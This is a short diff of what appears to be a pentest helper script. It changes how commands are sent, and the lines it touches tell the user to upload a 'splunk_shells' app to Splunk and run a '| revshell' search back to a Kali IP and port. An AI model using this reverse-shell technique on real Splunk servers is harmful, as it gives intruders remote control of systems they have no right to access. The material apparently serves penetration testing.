@@ -14,9 +14,9 @@ generate_form "${PORT_FIELD}"
 
 PORT=${form_data["port"]}
 
-paste_command "# upload ${REV_FOLDER}/splunk_shells-1.2.tar.gz -> click on the gear icon on the top left -> Install app from file -> Upload file"
-xdotool key Return
+execute_command "# upload ${REV_FOLDER}/splunk_shells-1.2.tar.gz -> click on the gear icon on the top left -> Install app from file -> Upload file"
+create_new_line
 
-paste_command "#after uploading and restarting the app search for '| revshell std ${KALI_IP} ${PORT}'"
-xdotool key Return
+execute_command "#after uploading and restarting the app search for '| revshell std ${KALI_IP} ${PORT}'"
+create_new_line
 
